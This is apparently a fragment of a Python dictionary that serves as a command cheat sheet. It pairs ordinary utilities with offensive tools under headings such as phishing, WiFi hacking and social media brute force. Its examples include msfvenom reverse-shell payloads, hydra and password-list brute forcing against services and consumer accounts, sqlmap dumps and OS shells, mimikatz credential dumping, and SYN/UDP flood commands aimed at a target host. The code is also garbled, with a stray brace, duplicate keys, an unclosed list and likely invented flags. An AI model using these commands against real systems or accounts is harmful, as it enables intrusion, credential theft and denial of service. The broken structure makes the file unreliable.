        ("-e archive.zip file", "Encrypt"),
    ],
    "unzip": [
        ("archive.zip", "Extract"),
        ("-P password archive.zip", "Password extract"),
        ("archive.zip -d /output/", "Output directory"),
    ],
    "tar": [
        ("-czf archive.tar.gz dir/", "Create gzip"),
        ("-xzf archive.tar.gz", "Extract gzip"),
        ("-cjf archive.tar.bz2 dir/", "Create bzip2"),
    ],
    "wget": [
        ("https://target.com/file.txt", "Download"),
        ("-r -np -k https://target.com", "Mirror site"),
        ("-O output.txt https://target.com", "Save as"),
        ("--user-agent='Mozilla/5.0' https://target.com", "Custom UA"),
    ],
    "git": [
        ("clone https://github.com/user/repo.git", "Clone repo"),
        ("clone --depth 1 https://github.com/user/repo.git", "Shallow clone"),
        ("log --oneline", "Commit history"),
        ("diff", "Show changes"),
    ],
    "python3": [
        ("-m http.server 8080", "HTTP server"),
        ("-c 'print("hello")'", "One-liner"),
        ("script.py", "Run script"),
    ],
    "pip": [
        ("install package", "Install package"),
        ("install -r requirements.txt", "Install from file"),
        ("list", "List installed"),
        ("freeze > requirements.txt", "Export list"),
    ],
    "go": [
        ("build main.go", "Build binary"),
        ("run main.go", "Run without build"),
        ("install github.com/tool/cmd@latest", "Install tool"),
    ],
    "gem": [
        ("install package", "Install gem"),
        ("list", "List gems"),
    ],
    "npm": [
        ("install package", "Install package"),
        ("install -g package", "Global install"),
        ("start", "Start project"),
    ],
    "docker": [
        ("ps -a", "List containers"),
        ("images", "List images"),
        ("run -it ubuntu bash", "Run interactive"),
        ("build -t name .", "Build image"),
        ("exec -it container bash", "Exec into container"),
    ],
    "kubectl": [
        ("get pods", "List pods"),
        ("get pods --all-namespaces", "All namespaces"),
        ("get nodes", "List nodes"),
        ("exec -it pod -- bash", "Exec into pod"),
        ("apply -f deployment.yaml", "Apply config"),
        ("delete pod name", "Delete pod"),
    ],
    "terraform": [
        ("init", "Initialize"),
        ("plan", "Plan changes"),
        ("apply -auto-approve", "Apply changes"),
        ("destroy -auto-approve", "Destroy resources"),
    ],
    "ansible": [
        ("all -m ping", "Ping all hosts"),
        ("webservers -m command -a 'uptime'", "Run command"),
        ("-i inventory playbook.yml", "Run playbook"),
    ],
    "ssh": [
        ("user@host", "Basic connect"),
        ("-p 2222 user@host", "Custom port"),
        ("-i key.pem user@host", "Key auth"),
        ("-L 8080:localhost:80 user@host", "Local forward"),
        ("-R 8080:localhost:80 user@host", "Remote forward"),
        ("-D 1080 user@host", "SOCKS proxy"),
    ],
    "scp": [
        ("file.txt user@host:/path/", "Copy to remote"),
        ("user@host:/path/file.txt .", "Copy from remote"),
        ("-r dir/ user@host:/path/", "Recursive"),
    ],
    "rsync": [
        ("-av dir/ user@host:/path/", "Sync to remote"),
        ("-av user@host:/path/ dir/", "Sync from remote"),
        ("-av --delete dir/ /backup/", "Mirror sync"),
    ],
    "screen": [
        ("-S session_name", "Named session"),
        ("-r session_name", "Reattach"),
        ("-ls", "List sessions"),
    ],
    "tmux": [
        ("new -s session_name", "New session"),
        ("attach -t session_name", "Attach"),
        ("ls", "List sessions"),
    ],
    "htop": [
        ("", "Interactive process viewer"),
        ("-u username", "Filter user"),
    ],
    "iftop": [
        ("-i wlan0", "Interface traffic"),
        ("-P", "Show ports"),
    ],
    "nethogs": [
        ("wlan0", "Interface bandwidth"),
        ("-d 5 wlan0", "5s refresh"),
    ],
    "vnstat": [
        ("-i wlan0", "Interface stats"),
        ("-d", "Daily stats"),
        ("-m", "Monthly stats"),
    ],

}
    # === SOCIAL MEDIA & PHISHING TOOLS ===
    "setoolkit": [
        ("-s", "Social engineering attacks"), ("-p", "Phishing attack vectors"),
        ("-w", "Website attack vectors"), ("-q", "Quick track"),
        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
        ("-t", "Tabnabbing"), ("-j", "Java applet attack")
    ],
    "socialfish": [
        ("-u", "Update"), ("-c", "Check credentials"), ("-r", "Run server"),
        ("-p 8080", "Port 8080"), ("--ssl", "Enable SSL")
    ],
    "zphisher": [
        ("-p", "Pick page"), ("-t", "Tunnel option"), ("-o", "Open port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok tunnel")
    ],
    "blackeye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server")
    ],
    "sherlock": [
        ("username", "Search username"), ("-o output/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All sites"),
        ("-t 10", "10 threads"), ("--timeout 5", "5s timeout")
    ],
    "holehe": [
        ("email@example.com", "Check email"), ("-o output.csv", "CSV output"),
        ("--only-used", "Only used"), ("-p", "Print results")
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads")
    ],
    "instaloader": [
        ("username", "Download profile"), ("--login YOUR_USER", "Login"),
        ("--stories", "Download stories"), ("--highlights", "Download highlights"),
        ("--tagged", "Tagged posts"), ("--igtv", "IGTV videos")
    ],
    "twint": [
        ("-u username", "User tweets"), ("-s search_term", "Search"),
        ("--since 2020-01-01", "Since date"), ("--csv", "CSV output"),
        ("-o output.json", "JSON output")
    ],
    "tweepy": [
        ("-u username", "User info"), ("-f followers", "Get followers"),
        ("-t timeline", "User timeline"), ("-s search", "Search tweets")
    ],
    "facebook-scraper": [
        ("-u profile_url", "Profile URL"), ("-p page_url", "Page URL"),
        ("-g group_url", "Group URL"), ("--posts 20", "20 posts"),
        ("--comments", "Get comments"), ("--likes", "Get likes")
    ],
    "tiktok-scraper": [
        ("-u username", "User"), ("-t hashtag", "Hashtag"),
        ("-n 50", "50 videos"), ("--download", "Download videos")
    ],
    "puppeteer": [
        ("-u URL", "Target URL"), ("-s screenshot.png", "Screenshot"),
        ("-p proxy:8080", "Proxy"), ("--headless", "Headless mode")
    ],
    
    # === PHISHING FRAMEWORKS ===
    "gophish": [
        ("--port 3333", "Admin port"), ("--config config.json", "Config file"),
        ("-v", "Verbose")
    ],
    "king-phisher": [
        ("--server", "Start server"), ("--config config.yml", "Config"),
        ("--debug", "Debug mode")
    ],
    "phishing-frenzy": [
        ("-s", "Start server"), ("-p 3000", "Port 3000"),
        ("-e production", "Environment")
    ],
    "evilginx2": [
        ("-p phishlet", "Phishlet name"), ("-t target.com", "Target"),
        ("-g group", "Phishlet group"), ("--debug", "Debug")
    ],
    "modlishka": [
        ("-config config.json", "Config"), ("-proxy target.com", "Proxy target"),
        ("-listeningAddress 0.0.0.0", "Listen"), ("-port 443", "Port")
    ],
    "muraena": [
        ("-config config.toml", "Config"), ("-phish phish.toml", "Phish config"),
        ("-t target.com", "Target domain"), ("-v", "Verbose")
    ],
    
    # === CREDENTIAL HARVESTING ===
    "credmap": [
        ("-u target.com", "Target URL"), ("-f login_form", "Login form"),
        ("-o output.txt", "Output"), ("-t 10", "Threads")
    ],
    "creds.py": [
        ("-u URL", "Target URL"), ("-p payload.txt", "Payload list"),
        ("-o output.txt", "Output file"), ("--proxy 127.0.0.1:8080", "Proxy")
    ],
    "pwned": [
        ("-e email@test.com", "Check email"), ("-d domain.com", "Check domain"),
        ("-o output.json", "JSON output")
    ],
    
    # === OSINT / RECON ===
    "theHarvester": [
        ("-d domain.com -b google", "Google search"), ("-d domain.com -b all", "All sources"),
        ("-d domain.com -b linkedin", "LinkedIn"), ("-f output.html", "HTML output"),
        ("-c", "DNS brute"), ("-n", "DNS lookup")
    ],
    "recon-ng": [
        ("-m module_name", "Module"), ("-w workspace", "Workspace"),
        ("--no-version", "No version check"), ("--verbose", "Verbose")
    ],
    "spiderfoot": [
        ("-s target.com", "Target"), ("-l 127.0.0.1:5001", "Web interface"),
        ("-m all", "All modules"), ("-t passive", "Passive only")
    ],
    "osrframework": [
        ("-u username", "Username search"), ("-e email@test.com", "Email search"),
        ("-p phone_number", "Phone lookup"), ("-d domain.com", "Domain search")
    ],
    "maltego": [
        ("-g graph.mtz", "Open graph"), ("-i import.csv", "Import data"),
        ("-t transform", "Run transform")
    ],
    
    # === WIFI HACKING ===
    "bettercap": [
        ("-iface wlan0", "Interface"), ("-caplet http-ui", "Web UI"),
        ("-eval 'net.probe on'", "Network probe"), ("-eval 'wifi.recon on'", "WiFi recon"),
        ("-eval 'wifi.deauth *'", "Deauth attack"), ("-eval 'net.sniff on'", "Packet sniff")
    ],
    "wireshark": [
        ("-i wlan0", "Interface"), ("-k", "Start capture"), ("-r capture.pcap", "Read file"),
        ("-Y 'http'", "Filter HTTP"), ("-Y 'dns'", "Filter DNS")
    ],
    "kismet": [
        ("-c wlan0", "Interface"), ("--no-server", "No web server"),
        ("--daemonize", "Background mode")
    ],
    "fluxion": [
        ("-i wlan0", "Interface"), ("-e 'WiFi Name'", "Target ESSID"),
        ("-c 6", "Channel 6"), ("-a", "Auto mode")
    ],
    "wifite": [
        ("-i wlan0", "Interface"), ("--wpa", "WPA only"), ("--wep", "WEP only"),
        ("--kill", "Kill processes"), ("--dict wordlist.txt", "Wordlist")
    ],
    "pixiewps": [
        ("-e pke -s ehash1 -z ehash2 -a authkey -n ehash2", "Crack WPS"),
        ("-f", "Force"), ("-v 3", "Verbose")
    ],
    "reaver": [
        ("-i wlan0 -b BSSID", "Target"), ("-vv", "Very verbose"),
        ("-c 6", "Channel"), ("-N", "No nacks"), ("-d 2", "Delay")
    ],
    
    # === WEB EXPLOITATION ===
    "burpsuite": [
        ("--project=project.burp", "Open project"), ("--config=config.json", "Config"),
        ("--collaborator-server", "Start collaborator"), ("--unpause-spidering", "Spider")
    ],
    "zap": [
        ("-cmd", "Command line"), ("-daemon", "Daemon mode"),
        ("-port 8080", "Port"), ("-config api.key=KEY", "API key")
    ],
    "commix": [
        ("-u URL", "Target URL"), ("--data 'cmd=id'", "POST data"),
        ("--os=unix", "Unix target"), ("--os=windows", "Windows target"),
        ("--technique=t", "Time-based"), ("--technique=e", "Error-based")
    ],
    "xsser": [
        ("-u URL", "Target URL"), ("--auto", "Auto mode"), ("--Fp", "Final payload"),
        ("--Fr", "Final remote"), ("--D", "Delay"), ("--threads 5", "5 threads"),
        ("-p 'param1,param2'", "Parameters"), ("--Coo='cookie'", "Cookie")
    ],
    "xsstrike": [
        ("-u URL", "Target URL"), ("--data 'param=value'", "POST data"),
        ("--fuzzer", "Fuzzer mode"), ("--crawl", "Crawl site"), ("--blind", "Blind XSS"),
        ("-t 10", "10 threads"), ("--json", "JSON output")
    ],
    "nosqlmap": [
        ("-u URL", "Target URL"), ("--mongodb", "MongoDB"), ("--couchdb", "CouchDB"),
        ("--dump", "Dump data"), ("--enum-databases", "Enum databases")
    ],
    
    # === ANDROID HACKING ===
    "msfvenom": [
        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe", "Windows payload"),
        ("-l payloads", "List payloads"), ("--list formats", "List formats")
    ],
    "apktool": [
        ("d app.apk", "Decompile"), ("b app/", "Build"), ("-f", "Force"),
        ("-o output.apk", "Output file")
    ],
    "jadx": [
        ("app.apk", "Decompile"), ("-d output/", "Output dir"), ("--deobf", "Deobfuscate")
    ],
    "dex2jar": [
        ("classes.dex", "Convert DEX"), ("-o output.jar", "Output JAR")
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"), ("-o output/", "Output"), ("-v", "Verbose")
    ],
    
    # === BLUETOOTH HACKING ===
    "bluetoothctl": [
        ("scan on", "Scan devices"), ("pair MAC", "Pair device"),
        ("connect MAC", "Connect"), ("info MAC", "Device info")
    ],
    "hcitool": [
        ("scan", "Scan devices"), ("info MAC", "Device info"),
        ("name MAC", "Device name"), ("inq", "Inquiry")
    ],
    "blueranger": [
        ("-i hci0", "Interface"), ("-t MAC", "Target"), ("-r", "Range test")
    ],
    "bluesnarfer": [
        ("-b MAC", "Target"), ("-C 6", "Channel"), ("-i hci0", "Interface")
    ],
    
    # === VOIP HACKING ===
    "sipvicious": [
        ("-p 5060 target.com", "SIP scan"), ("-e 100-200 target.com", "Extension scan"),
        ("-m invite target.com", "Method scan")
    ],
    "voiphopper": [
        ("-i eth0", "Interface"), ("-c 1", "VLAN 1"), ("-m", "MAC spoof")
    ],


    # === SOCIAL MEDIA BRUTE FORCE ===
    "sherlock": [
        ("username", "Search username"), ("--output results/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All 300+ sites"),
        ("--timeout 5", "5s timeout"), ("-t 20", "20 threads"),
        ("--print-found", "Print found only"), ("--nsfw", "Include NSFW"),
    ],
    "holehe": [
        ("email@test.com", "Check email"), ("--only-used", "Only registered"),
        ("-o output.csv", "CSV output"), ("-p", "Print results"),
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Single password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads"),
        ("--proxy 127.0.0.1:8080", "Use proxy"),
    ],
    "instagram-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "facebook-brute": [
        ("-u user@email.com", "Email/ID"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "twitter-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "tiktok-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "snapchat-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "linkedin-brute": [
        ("-u email@test.com", "Target email"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "github-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "reddit-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "pinterest-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "tumblr-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "spotify-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "netflix-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "hulu-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "amazon-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "paypal-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 3", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "ebay-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "wordpress-brute": [
        ("--url http://target.com", "Target URL"), ("--usernames admin", "Single user"),
        ("-U users.txt", "User list"), ("-P pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "joomla-brute": [
        ("-u http://target.com", "Target URL"), ("-w admin", "Username"),
        ("-p pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "drupal-brute": [
        ("-u http://target.com", "Target URL"), ("-U users.txt", "User list"),
        ("-P pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "magento-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],
    "prestashop-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],



    # === POWERFUL PHISHING TOOLKITS ===
    "evilginx2": [
        ("-p phishlet", "Phishlet name"), ("-t target.com", "Target domain"),
        ("-g group", "Phishlet group"), ("--debug", "Debug mode"),
        ("--developer", "Developer mode"), ("-c config.json", "Config file"),
        ("-w watch_dir", "Watch directory"), ("--no-database", "No DB"),
        ("--https-port 443", "HTTPS port"), ("--dns-port 53", "DNS port"),
    ],
    "gophish": [
        ("--port 3333", "Admin port"), ("--config config.json", "Config"),
        ("-v", "Verbose"), ("--no-console", "No console"),
        ("--reset-db", "Reset database"), ("--import-csv targets.csv", "Import targets"),
    ],
    "modlishka": [
        ("-config config.json", "Config file"), ("-proxy target.com", "Proxy target"),
        ("-listeningAddress 0.0.0.0", "Listen"), ("-port 443", "Port"),
        ("-plugins all", "All plugins"), ("-trackingParam id", "Tracking param"),
        ("-jsRules 'replace'", "JS rules"), ("-cert email@test.com", "Auto cert"),
    ],
    "muraena": [
        ("-config config.toml", "Config"), ("-phish phish.toml", "Phish config"),
        ("-t target.com", "Target"), ("-v", "Verbose"),
        ("-debug", "Debug"), ("-no-browser", "No browser"),
        ("-workers 10", "10 workers"), ("-timeout 30", "30s timeout"),
    ],
    "zphisher": [
        ("-p", "Pick page"), ("-t", "Tunnel option"), ("-o", "Open port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok tunnel"),
        ("--cloudflared", "Cloudflare tunnel"), ("--localXpose", "LocalXpose"),
    ],
    "blackeye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("-u", "Update"), ("-c", "Check"),
    ],
    "socialfish": [
        ("-u", "Update"), ("-c", "Check creds"), ("-r", "Run server"),
        ("-p 8080", "Port"), ("--ssl", "Enable SSL"),
        ("--tunnel ngrok", "Ngrok tunnel"), ("--tunnel localhost", "Local only"),
    ],
    "setoolkit": [
        ("-s", "Social engineering"), ("-p", "Phishing vectors"),
        ("-w", "Website vectors"), ("-q", "Quick track"),
        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
        ("-t", "Tabnabbing"), ("-j", "Java applet"),
        ("-k", "Ettercap"), ("-a", "Arduino attack"),
    ],
    "credphisher": [
        ("-u", "Update"), ("-s", "Start server"), ("-p 8080", "Port"),
        ("--ssl", "SSL"), ("--tunnel", "Tunnel mode"),
    ],
    "phishim": [
        ("-t office365", "Office365"), ("-t gmail", "Gmail"),
        ("-t outlook", "Outlook"), ("-t yahoo", "Yahoo"),
        ("-p 8080", "Port"), ("--ssl", "SSL"),
    ],
    "king-phisher": [
        ("--server", "Start server"), ("--config config.yml", "Config"),
        ("--debug", "Debug"), ("--restore", "Restore session"),
    ],
    "sneakemail": [
        ("-f spoof@test.com", "From"), ("-t target@test.com", "To"),
        ("-s 'Subject'", "Subject"), ("-b 'Body'", "Body"),
        ("-a attachment.pdf", "Attachment"), ("-h smtp.server.com", "SMTP"),
    ],
    "swaks": [
        ("--to target@test.com", "To"), ("--from spoof@test.com", "From"),
        ("--server smtp.gmail.com", "SMTP"), ("--header 'Subject: Test'", "Subject"),
        ("--body 'Test body'", "Body"), ("--attach file.pdf", "Attachment"),
        ("--tls", "Use TLS"), ("--auth LOGIN", "Auth type"),
    ],
    "hiddeneye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("-u", "Update"),
    ],
    "shellphish": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-o", "Port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok"),
    ],
    "advphishing": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("--ngrok", "Ngrok tunnel"),
    ],
    "mrphish": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-o", "Port"),
        ("--ngrok", "Ngrok"), ("--cloudflared", "Cloudflare"),
    ],



    # === PRE-BUILT EXAMPLES - NORMAL TO BRUTE FORCE ===
    "nmap": [
        ("-F target.com", "Fast scan top 100 ports"),
        ("-sV target.com", "Service version detection"),
        ("-sC target.com", "Default scripts"),
        ("-sV -sC -O target.com", "Full audit"),
        ("-p- target.com", "All 65535 ports"),
        ("-p 1-1000 target.com", "Top 1000 ports"),
        ("-sS -T4 target.com", "Stealth SYN scan"),
        ("-sU target.com", "UDP scan"),
        ("--script vuln target.com", "Vulnerability scan"),
        ("--script brute target.com", "Brute force scripts"),
        ("--script exploit target.com", "Exploit detection"),
        ("--script auth target.com", "Auth bypass scan"),
        ("-A -T4 target.com", "Aggressive scan"),
        ("-sV --script vuln -p- target.com", "Full vuln audit"),
        ("-sn 192.168.1.0/24", "Ping sweep network"),
    ],
    "gobuster": [
        ("dir -u http://target.com -w wordlist.txt", "Directory brute"),
        ("dns -d target.com -w wordlist.txt", "DNS subdomain brute"),
        ("vhost -u http://target.com -w wordlist.txt", "Virtual host brute"),
        ("dir -u http://target.com -w wordlist.txt -x php,html,txt", "With extensions"),
        ("dir -u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("dir -u http://target.com -w wordlist.txt -k", "Skip SSL verify"),
    ],
    "hydra": [
        ("-l admin -P rockyou.txt ssh://target", "SSH single user brute"),
        ("-L users.txt -P pass.txt ssh://target", "SSH user list brute"),
        ("-l admin -P pass.txt ftp://target", "FTP brute"),
        ("-l root -P pass.txt mysql://target", "MySQL brute"),
        ("-L users.txt -P pass.txt http-post-form://target/login:user=^USER^&pass=^PASS^:F=error", "HTTP form brute"),
        ("-L users.txt -P pass.txt smb://target", "SMB brute"),
        ("-l admin -P pass.txt rdp://target", "RDP brute"),
        ("-L users.txt -P pass.txt mssql://target", "MSSQL brute"),
        ("-l admin -P pass.txt telnet://target", "Telnet brute"),
        ("-t 16 -f -V -l admin -P pass.txt ssh://target", "Fast single user brute"),
    ],
    "sqlmap": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
        ("-u http://target.com/page.php?id=1 --dbs", "Enumerate databases"),
        ("-u http://target.com/page.php?id=1 -D db --tables", "Enumerate tables"),
        ("-u http://target.com/page.php?id=1 -D db -T users --dump", "Dump table"),
        ("-u http://target.com/page.php?id=1 --batch", "Auto answers"),
        ("-u http://target.com/page.php?id=1 --level=5 --risk=3", "Max level/risk"),
        ("-u http://target.com/page.php?id=1 --os-shell", "OS shell attempt"),
        ("-u http://target.com/page.php?id=1 --tamper=space2comment", "WAF bypass"),
        ("-r request.txt -p id", "From request file"),
        ("--dbs --tables --columns --dump --batch", "Full auto dump"),
    ],
    "john": [
        ("--wordlist=rockyou.txt hash.txt", "Dictionary attack"),
        ("--rules --wordlist=rockyou.txt hash.txt", "Rules attack"),
        ("--incremental hash.txt", "Incremental brute"),
        ("--format=raw-md5 hash.txt", "MD5 format"),
        ("--format=raw-sha256 hash.txt", "SHA256 format"),
        ("--show hash.txt", "Show cracked"),
    ],
    "hashcat": [
        ("-m 0 -a 0 hash.txt rockyou.txt", "MD5 dictionary"),
        ("-m 0 -a 3 hash.txt ?l?l?l?l?l?l", "MD5 mask brute 6 lower"),
        ("-m 1000 -a 0 hash.txt rockyou.txt", "NTLM dictionary"),
        ("-m 2500 -a 0 hash.hc22000 rockyou.txt", "WPA dictionary"),
        ("-m 0 -a 0 hash.txt rockyou.txt -O -w 4", "Optimized max power"),
        ("-m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a", "8 char all charset brute"),
    ],
    "ffuf": [
        ("-u http://target.com/FUZZ -w wordlist.txt", "Directory fuzz"),
        ("-u http://target.com/FUZZ -w wordlist.txt -mc 200,301", "Match codes"),
        ("-u http://target.com/FUZZ -w wordlist.txt -fc 404", "Filter 404"),
        ("-u http://target.com/FUZZ -w wordlist.txt -t 200", "200 threads"),
        ("-u http://target.com/api/FUZZ -w api.txt -H 'Content-Type: application/json'", "API fuzz"),
        ("-u http://FUZZ.target.com -w subdomains.txt", "Subdomain fuzz"),
    ],
    "curl": [
        ("-I https://target.com", "Headers only"),
        ("-v https://target.com", "Verbose"),
        ("-L https://target.com", "Follow redirects"),
        ("-X POST -d 'user=admin&pass=test' https://target.com/login", "POST data"),
        ("-H Content-Type: application/json -d data https://target.com/api", "JSON API"),

    # === MORE PRE-BUILT EXAMPLES ===
    "masscan": [
        ("-p80,443 192.168.1.0/24 --rate=1000", "Web ports fast"),
        ("-p1-65535 target.com --rate=5000", "All ports fast"),
        ("-p22,80,443,8080,8443 target.com", "Common ports"),
        ("-p- target.com --rate=10000", "Full port max speed"),
        ("-p80,443 192.168.1.0/24 -oJ scan.json", "JSON output"),
    ],
    "rustscan": [
        ("-a target.com", "Fast scan"),
        ("-a target.com -p 1-1000", "Port range"),
        ("-a target.com --ulimit 5000 -t 2000", "Max speed"),
        ("-a 192.168.1.0/24 -p 22,80,443", "Network scan"),
    ],
    "amass": [
        ("enum -d target.com", "Basic enum"),
        ("enum -passive -d target.com", "Passive only"),
        ("enum -active -d target.com", "Active enum"),
        ("enum -d target.com -o output.txt", "Save output"),
        ("intel -d target.com", "Intelligence gather"),
    ],
    "subfinder": [
        ("-d target.com", "Basic subdomain"),
        ("-d target.com -silent", "Silent mode"),
        ("-d target.com -o subs.txt", "Save to file"),
        ("-dL domains.txt -o all_subs.txt", "Bulk domains"),
    ],
    "httpx": [
        ("-l subs.txt -o live.txt", "Check live hosts"),
        ("-l subs.txt -status-code -title", "Status and title"),
        ("-l subs.txt -tech-detect", "Tech detection"),
        ("-l subs.txt -silent -o live.txt", "Silent output"),
    ],
    "nuclei": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com -severity critical,high", "Critical/High only"),
        ("-l targets.txt -t cves/", "CVE templates"),
        ("-u http://target.com -t exposures/", "Exposure scan"),
        ("-u http://target.com -o report.txt", "Save report"),
    ],
    "wapiti": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com --scope page", "Page scope"),
        ("-u http://target.com -f txt -o report", "TXT report"),
    ],
    "skipfish": [
        ("-o /tmp/output http://target.com", "Basic scan"),
        ("-o /tmp/output -I target.com http://target.com", "Target only"),
    ],
    "testssl": [
        ("https://target.com", "Full test"),
        ("--each-cipher https://target.com", "Each cipher"),
        ("--json https://target.com", "JSON output"),
        ("--parallel https://target.com", "Fast parallel"),
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"),
        ("--json_out out.json target.com", "JSON output"),
    ],
    "responder": [
        ("-I eth0", "Start on eth0"),
        ("-I wlan0 -rdwv", "Full mode WiFi"),
        ("-I eth0 -A", "Analyze mode"),
    ],
    "impacket": [
        ("psexec.py domain/user:pass@target", "PSExec"),
        ("wmiexec.py domain/user:pass@target", "WMIExec"),
        ("smbexec.py domain/user:pass@target", "SMBExec"),
        ("secretsdump.py domain/user:pass@target", "Dump secrets"),
        ("ntlmrelayx.py -t smb://target -smb2support", "NTLM relay"),
    ],
    "crackmapexec": [
        ("smb target -u user -p pass", "SMB check"),
        ("smb 192.168.1.0/24 -u user -p pass --shares", "Network shares"),
        ("winrm target -u user -p pass -x 'whoami'", "WinRM exec"),
        ("mssql target -u sa -p password", "MSSQL check"),
    ],
    "bloodhound": [
        ("-d domain -u user -p pass -ns nameserver -c all", "Full collection"),
        ("-d domain -u user -p pass -ns nameserver", "Basic collection"),
    ],
    "mimikatz": [
        ("privilege::debug sekurlsa::logonpasswords", "Dump passwords"),
        ("lsadump::sam", "Dump SAM"),
        ("lsadump::secrets", "Dump secrets"),
        ("token::elevate", "Elevate token"),
    ],
    "chisel": [
        ("server -p 8080 --reverse", "Server reverse"),
        ("client server:8080 R:4444:localhost:4444", "Client reverse"),
    ],
    "ligolo": [
        ("-bind 0.0.0.0:11601", "Start proxy"),
        ("-connect proxy:11601 -ignore-cert", "Connect agent"),
    ],
    "proxychains": [
        ("nmap -sT target.com", "Nmap via proxy"),
        ("curl target.com", "Curl via proxy"),
        ("firefox", "Browser via proxy"),
    ],
    "torify": [
        ("nmap -sT target.com", "Nmap via Tor"),
        ("curl target.com", "Curl via Tor"),
    ],
    "wifite": [
        ("-i wlan0", "Basic scan"),
        ("-i wlan0 --wpa", "WPA only"),
        ("-i wlan0 --wep", "WEP only"),
        ("-i wlan0 --kill", "Kill interfering"),
    ],
    "reaver": [
        ("-i wlan0mon -b BSSID -vv", "WPS attack"),
        ("-i wlan0mon -b BSSID -c 6 -vv", "Specific channel"),
    ],
    "kismet": [
        ("-c wlan0", "Start capture"),
        ("-c wlan0 --no-server", "No web server"),
    ],
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood"),
        ("-1 target.com --flood", "ICMP flood"),
        ("-S target.com -p 80 --rand-source", "Random source SYN"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
    ],
    "ab": [
        ("-n 1000 -c 100 http://target.com/", "1000 requests 100 concurrent"),
        ("-n 10000 -c 200 -t 30 http://target.com/", "30s stress test"),
    ],
    "siege": [
        ("-c 100 -t 30s http://target.com", "100 users 30s"),
        ("-c 200 -r 50 http://target.com", "200 users 50 reps"),
        ("-f urls.txt", "URL list file"),
    ],



    # === EVEN MORE PRE-BUILT EXAMPLES ===
    "burpsuite": [
        ("--project=project.burp", "Open project"),
        ("--config=config.json", "Load config"),
        ("--collaborator-server", "Start collaborator"),
        ("--unpause-spidering", "Resume spider"),
    ],
    "zaproxy": [
        ("-cmd -quickurl http://target.com", "Quick scan"),
        ("-daemon -port 8080", "Daemon mode"),
        ("-cmd -quickurl http://target.com -quickout report.html", "Quick with report"),
    ],
    "commix": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
